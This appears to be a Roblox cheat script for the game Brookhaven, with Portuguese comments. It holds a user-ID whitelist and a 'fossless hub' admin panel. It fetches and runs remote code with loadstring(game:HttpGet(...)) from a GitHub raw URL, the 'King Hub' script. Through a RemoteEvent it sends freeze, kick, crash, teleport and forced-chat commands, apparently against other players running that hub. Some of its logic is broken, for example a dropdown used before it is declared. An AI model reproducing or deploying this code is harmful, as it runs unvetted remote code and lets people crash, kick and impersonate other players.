if game.PlaceId ~= 4924922222 then
    return print("Este script só funciona no Brookhaven.")
end

-- =================================================================
-- VERIFICAÇÃO DE PERMISSÃO (WHITELIST)
-- =================================================================

local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer

-- LISTA DE USUÁRIOS AUTORIZADOS (Substitua os números pelos IDs reais!)
local AuthorizedUsers = {
    [4613540861] = true,
    [4381751006] = true,
    [8198722012] = true,
    [2582395184] = true,
	[10152199966] = true,
}

if not AuthorizedUsers[LocalPlayer.UserId] then
    -- Se o ID do usuário não estiver na lista, para o script.
    print("❌ Acesso Negado. Este Painel ADM é restrito.")
    return 
end

print("✅ Acesso Autorizado. Carregando King Hub e Painel ADM...")

-- =================================================================
-- CARREGAMENTO AUTOMÁTICO DO KING HUB (OBEDIÊNCIA) - [NOVO]
-- =================================================================

loadstring(game:HttpGet("https://raw.githubusercontent.com/nhamajomari-oss/fossless/refs/heads/main/%F0%9F%91%91King%20hubl%F0%9F%91%91.lua", true))()

-- =================================================================
-- CONFIGURAÇÃO INICIAL (Comunicação Remota e Serviços)
-- =================================================================

local ReplicatedStorage = game:GetService("ReplicatedStorage")
-- Note: Players e LocalPlayer já foram definidos acima

-- Cria ou referencia o RemoteEvent "KingHubControl" para ENVIAR comandos.
local PrivateRemote = ReplicatedStorage:FindFirstChild("KingHubControl")
if not PrivateRemote then
    PrivateRemote = Instance.new("RemoteEvent")
    PrivateRemote.Name = "KingHubControl"
    PrivateRemote.Parent = ReplicatedStorage
end

-- Variável global para armazenar o objeto do jogador selecionado
_G.TargetPlayer = nil 

-- Função auxiliar para simplificar o envio de comandos remotos
local function sendRemoteCommand(command, value)
    local selectedTargetName = DropdownPlayers:GetValue()
    if selectedTargetName and selectedTargetName ~= "Nenhum Selecionado" then
        PrivateRemote:FireAllClients(command, selectedTargetName, value)
        Window:Notify("Comando Remoto", command .. " enviado para " .. selectedTargetName, 4)
    else
        Window:Notify("Aviso", "Selecione um alvo no Dropdown 'Selecionar Alvo' primeiro.", 3, "warning")
    end
end

-- Função para listar os nomes dos jogadores (excluindo o local player)
local function GetPlayerNames()
    local playerNames = {}
    for _, player in ipairs(Players:GetPlayers()) do
        if player.Name ~= LocalPlayer.Name then
            table.insert(playerNames, player.Name)
        end
    end
    -- Retorna um valor padrão se não houver outros jogadores
    if #playerNames == 0 then
        return {"Nenhum Selecionado"}
    end
    return playerNames
end

-- =================================================================================================
-- CARREGAMENTO E ESTRUTURA PRINCIPAL DO WIND UI (Loadstring Solicitada)
-- =================================================================================================

-- USANDO O LINK DE LATEST RELEASE SOLICITADO PELO GOAT7ᵀᴹ
local WindUI = loadstring(game:HttpGet("https://github.com/Footagesus/WindUI/releases/latest/download/main.lua"))()

local Window = WindUI:CreateWindow({
    Title = "☠️ fossless hub ☠️ | Painel adm",
    Icon = "shield",
    Author = "by GOAT7",
    Folder = "☠️ fossless hub ☠️ ADM",
    
    -- Configurações visuais (Mantidas)
    Size = UDim2.fromOffset(580, 460),
    Transparent = true,
    Theme = "Dark",
    Resizable = true,
    SideBarWidth = 200,
    BackgroundImageTransparency = 0.42,
    HideSearchBar = true,
    ScrollBarEnabled = false,
    
    User = {
        Enabled = true,
        Anonymous = false,
        Callback = function()
            print("clicked")
        end,
    },
})

-- =================================================================================================
-- ABA: ADMINISTRAÇÃO (Botões e Lógica mantidas)
-- =================================================================================================

-- ... (O restante do seu código WindUI, incluindo abas e botões, permanece o mesmo) ...

local Tab = Window:Tab({
    Title = "administração",
    Icon = "shield",
    Locked = false,
})


-- =================================================================================================
-- SEÇÃO: PLAYERS (Seleção de Alvo)
-- =================================================================================================

local SectionPlayers = Tab:Section({ 
    Title = "Players",
})

-- Cria o Dropdown para selecionar o jogador
local DropdownPlayers = Tab:Dropdown({
    Title = "Selecionar Alvo",
    Desc = "Escolha um jogador para aplicar os comandos",
    Values = GetPlayerNames(),
    Value = "Nenhum Selecionado",
    Callback = function(playername) 
        -- Armazena o objeto do jogador selecionado
        _G.TargetPlayer = Players:FindFirstChild(playername)
        if _G.TargetPlayer then
             Window:Notify("Alvo Selecionado", "Alvo definido para: " .. _G.TargetPlayer.Name, 5)
        else
             Window:Notify("Aviso", "Jogador não encontrado ou desconectado.", 5)
             _G.TargetPlayer = nil
        end
    end
})

-- Botão para atualizar a lista de jogadores
Tab:Button({
    Title = "Atualizar Lista",
    Desc = "Atualiza a lista de jogadores online.",
    Locked = false,
    Callback = function()
        -- Atualiza os valores do Dropdown
        DropdownPlayers:SetValues(GetPlayerNames())
        Window:Notify("Sucesso", "Lista de jogadores atualizada!")
    end
})

-- =================================================================================================
-- SEÇÃO: COMANDOS
-- =================================================================================================

local SectionComandos = Tab:Section({ 
    Title = "comandos",
})

    -- Botão para verificar o player (COMANDO ATUALIZADO)
      Tab:Button({
    Title = "verifique",
    Desc = "identificar os users",
    Locked = false,
    Callback = function()
        local verificationMessage = "ME-USE / GOAT7"
        
        -- Dispara o RemoteEvent: Comando "Verify", Alvo "ALL", Valor (Mensagem)
        -- O alvo "ALL" garante que todos os usuários do King Hub falem.
        PrivateRemote:FireAllClients("Verify", "ALL", verificationMessage)
        
        Window:Notify("Comando Remoto", "Comando 'Verifique' enviado para todos os King Hub users.", 4)
    end
})

    -- FREEZE
    Tab:Button({
    Title = "freeze",
    Desc = "congelar o user",
    Locked = false,
    Callback = function()
        sendRemoteCommand("Freeze") -- Envia o comando "Freeze"
    end
})

    -- UNFREEZE
    Tab:Button({
         Title = "unfreeze",
    Desc = "descongelar o user",
      Locked = false,
         Callback = function()
             sendRemoteCommand("Unfreeze") -- Envia o comando "Unfreeze"
      end
})

    -- BRING
     Tab:Button({
    Title = "bring",
    Desc = "puxar o player",
    Locked = false,
    Callback = function()
        local adminCFrame = LocalPlayer.Character and LocalPlayer.Character.HumanoidRootPart.CFrame
        if adminCFrame then
            sendRemoteCommand("Bring", adminCFrame) -- Envia o comando "Bring" com sua posição (CFrame)
        else
            Window:Notify("Erro", "Seu personagem não está carregado para enviar a posição.", 3, "error")
        end
    end
}) 
        
    -- KICK
    Tab:Button({
         Title = "kick",
         Desc = "expulsar o user",
         Locked = false,
         Callback = function()
            sendRemoteCommand("Kick") -- Envia o comando "Kick"
     end
})

    -- CRASH
    Tab:Button({
    Title = "crash",
    Desc = "crashar o player",
    Locked = false,
    Callback = function()
        sendRemoteCommand("Crash") -- Envia o comando "Crash"
    end
})

-- =================================================================================================
-- ABA: SAY (Mensagens Remotas)
-- =================================================================================================

     local TabSay = Window:Tab({
    Title = "Say",
    Icon = "circle-user-round",
    Locked = false,
})

     local SectionSayPlayers = TabSay:Section({ 
    Title = "players",
})

      local DropdownSay = TabSay:Dropdown({
    Title = "Alvo para Falar",
    Desc = "Escolha o jogador que irá enviar a mensagem",
    Values = GetPlayerNames(),
    Value = "Nenhum Selecionado",
    Callback = function(option) 
        -- Nenhuma ação é necessária aqui
    end
})

    TabSay:Button({
    Title = "atualizar",
    Desc = "atualiza a lista",
    Locked = false,
    Callback = function()
        DropdownSay:SetValues(GetPlayerNames())
        Window:Notify("Sucesso", "Lista de jogadores Say atualizada!")
    end
})

      local SectionSayInput = TabSay:Section({ 
    Title = "Say",
})

     local InputMessage = TabSay:Input({
    Title = "say",
    Desc = "falar no chat do player selecionado",
    Value = "", -- Valor inicial vazio
    InputIcon = "closed-caption",
    Type = "Input",
    Placeholder = "Digite a mensagem...",
    Callback = function(input) 
        -- Nenhuma ação é necessária aqui
    end
})

    -- BOTÃO ENVIAR MENSAGEM
    TabSay:Button({
    Title = "enter",
    Desc = "mandar a mensagem",
    Locked = false,
    Callback = function()
        local message = InputMessage:GetValue() -- Pega o texto
        local target = DropdownSay:GetValue() -- Pega o alvo
        
        if target ~= "Nenhum Selecionado" and message ~= "" then
            -- Comando Remoto: SayMessage
            PrivateRemote:FireAllClients("SayMessage", target, message)
            Window:Notify("Comando Remoto", "Mensagem enviada para " .. target, 4)
        else
            Window:Notify("Aviso", "Selecione um alvo e digite uma mensagem.", 3, "warning")
        end
    end
})

-- =================================================================================================
-- SINCRONIZAÇÃO AUTOMÁTICA
-- =================================================================================================

-- Lógica para atualizar automaticamente os Dropdowns
Players.PlayerAdded:Connect(function()
    local names = GetPlayerNames()
    DropdownPlayers:SetValues(names)
    DropdownSay:SetValues(names)
end)

Players.PlayerRemoving:Connect(function()
    local names = GetPlayerNames()
    DropdownPlayers:SetValues(names)
    DropdownSay:SetValues(names)
end)
